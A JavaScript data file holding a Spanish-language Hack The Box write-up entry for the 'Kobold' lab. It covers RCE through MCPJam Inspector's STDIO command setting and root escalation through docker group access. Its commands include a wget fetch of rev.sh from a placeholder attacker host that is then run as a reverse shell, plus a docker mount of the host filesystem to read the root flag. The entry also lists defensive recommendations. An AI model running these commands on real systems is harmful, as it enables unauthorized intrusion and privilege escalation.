(function () {
  const base = Array.isArray(window.WRITEUPS) ? window.WRITEUPS : [];

  const kobold = {
    id: "kobold-mcpjam-docker",
    title: "Kobold: MCPJam RCE y escalada mediante Docker",
    url: "writeup.html?id=kobold-mcpjam-docker",
    category: "Seguridad Web",
    difficulty: "Fácil",
    readTime: "10 min",
    date: "2026",
    visibility: "Versión pública saneada",
    summary: "Writeup de HTB Kobold: enumeración de vhosts, explotación de MCPJam para obtener RCE como ben y escalada a root abusando del acceso al grupo Docker.",
    tags: ["HTB", "MCPJam", "MCP", "RCE", "Docker", "Linux", "Privilege Escalation"],
    stack: ["Nmap", "Gobuster", "MCPJam", "Node.js", "Docker", "Linux"],
    cover: "assets/imgs/cover-webshell.svg",
    icon: "🧌",
    featured: true,
    highlight: "Cadena completa desde descubrimiento de subdominio MCP hasta root mediante montaje del filesystem host con Docker.",
    labName: "Kobold",
    target: "Hack The Box machine",
    impact: "RCE como usuario ben y compromiso total del host",
    killChain: [
      "Nmap",
      "VHost enumeration",
      "MCPJam Inspector",
      "MCP server command execution",
      "Reverse shell",
      "operator to docker",
      "Host filesystem mount"
    ],
    sections: {
      executiveSummary: "La máquina Kobold presenta una cadena de explotación directa pero muy representativa: tras el reconocimiento inicial se identifican subdominios internos, especialmente mcp.kobold.htb, donde MCPJam Inspector permite configurar servidores MCP. Mediante abuso de la ejecución de comandos asociada a la configuración STDIO se obtiene una reverse shell como el usuario ben. La escalada se completa al detectar pertenencia al grupo operator y obtener contexto de docker con newgrp, permitiendo montar el sistema raíz del host desde un contenedor y leer la flag de root.",
      scopeContext: "El caso se documenta como laboratorio controlado de Hack The Box. Las flags, tokens, contraseñas y valores sensibles se omiten o sustituyen por marcadores saneados.",
      reconnaissanceEnumeration: [
        "Escaneo inicial de puertos y fingerprinting de servicios.",
        "Adición del dominio kobold.htb al fichero /etc/hosts.",
        "Enumeración de virtual hosts con Gobuster y SecLists.",
        "Descubrimiento de mcp.kobold.htb como superficie principal de ataque.",
        "Identificación de MCPJam Inspector y revisión de la funcionalidad para añadir servidores MCP."
      ],
      attackSurfaceAnalysis: "El vector de ataque se encuentra en la funcionalidad de MCPJam para añadir servidores MCP mediante conexión STDIO. La aplicación acepta comandos para iniciar procesos MCP, lo que permite abusar de la ejecución de binarios y generar callbacks hacia la máquina atacante. Este comportamiento convierte una configuración funcional en ejecución remota de comandos dentro del contexto del usuario que ejecuta el inspector.",
      initialAccess: "La ejecución se valida primero con callbacks HTTP mediante wget hacia la máquina atacante. Posteriormente se aloja un script rev.sh en un servidor HTTP local y se descarga en /tmp/rev.sh desde la víctima. Al ejecutar el script mediante la configuración MCP se obtiene una reverse shell como ben.",
      privilegeEscalation: "La enumeración local muestra que ben pertenece al grupo operator. Mediante newgrp docker se obtiene contexto efectivo del grupo docker, lo que permite interactuar con el socket Docker. Al listar imágenes existentes se identifica mysql y se lanza un contenedor montando / del host en /mnt/host. Finalmente se usa chroot para leer /root/root.txt desde el filesystem del host.",
      recommendations: [
        "No permitir que usuarios no privilegiados definan comandos STDIO arbitrarios para servidores MCP.",
        "Aislar el proceso MCPJam con un usuario sin privilegios y políticas estrictas de ejecución.",
        "Validar y restringir los binarios permitidos al crear servidores MCP.",
        "Evitar que grupos intermedios como operator puedan acceder directa o indirectamente a docker.",
        "Tratar la pertenencia al grupo docker como equivalente a privilegios root.",
        "Monitorizar conexiones salientes inesperadas desde servicios internos hacia hosts externos."
      ],
      conclusion: "Kobold demuestra cómo una funcionalidad legítima de integración con MCP puede transformarse en RCE si permite ejecutar procesos arbitrarios. La escalada refuerza una lección clásica: Docker mal delegado equivale prácticamente a root."
    },
    commands: [
      "gobuster vhost -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k --append-domain",
      "wget http://<attacker-ip>:8000/rev.sh -O /tmp/rev.sh",
      "sh /tmp/rev.sh",
      "id",
      "groups",
      "newgrp docker",
      "docker image ls",
      "docker run --rm -v /:/mnt/host mysql chroot /mnt/host /bin/bash -c 'whoami; cat /root/root.txt'"
    ],
    evidence: [
      {
        title: "Enumeración de virtual hosts",
        phase: "Reconocimiento y enumeración",
        description: "Gobuster con SecLists permite descubrir mcp.kobold.htb como subdominio relevante de la máquina.",
        command: "gobuster vhost -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k --append-domain",
        redacted: false
      },
      {
        title: "MCPJam Inspector como superficie de ataque",
        phase: "Análisis de superficie",
        description: "La interfaz permite añadir servidores MCP de tipo STDIO y definir el comando que se ejecutará para levantar el servidor.",
        command: "Connection Type: STDIO\nCommand: wget http://<attacker-ip>:8000/rev.sh -O /tmp/rev.sh",
        redacted: true
      },
      {
        title: "Reverse shell como ben",
        phase: "Acceso inicial",
        description: "Tras descargar y ejecutar un script controlado desde la máquina atacante, se obtiene una shell como el usuario ben.",
        command: "sh /tmp/rev.sh\nwhoami\nid",
        redacted: true
      },
      {
        title: "Enumeración de grupos",
        phase: "Post-explotación",
        description: "La revisión de grupos muestra la pertenencia de ben a operator y permite continuar hacia el vector Docker.",
        command: "id\ngroups",
        redacted: false
      },
      {
        title: "Cambio de grupo y acceso a Docker",
        phase: "Escalada de privilegios",
        description: "newgrp docker cambia el grupo efectivo de la sesión, permitiendo listar imágenes Docker existentes.",
        command: "newgrp docker\nid\ndocker image ls",
        redacted: false
      },
      {
        title: "Lectura de root flag mediante contenedor",
        phase: "Escalada de privilegios",
        description: "Se lanza un contenedor montando el filesystem raíz del host y se usa chroot para leer la flag de root. El valor real se sustituye por HTB{REDACTED}.",
        command: "docker run --rm -v /:/mnt/host mysql chroot /mnt/host /bin/bash -c 'whoami; cat /root/root.txt'",
        redacted: true
      }
    ]
  };

  if (!base.some((existing) => existing.id === kobold.id)) {
    base.unshift(kobold);
  }

  window.WRITEUPS = base;
})();
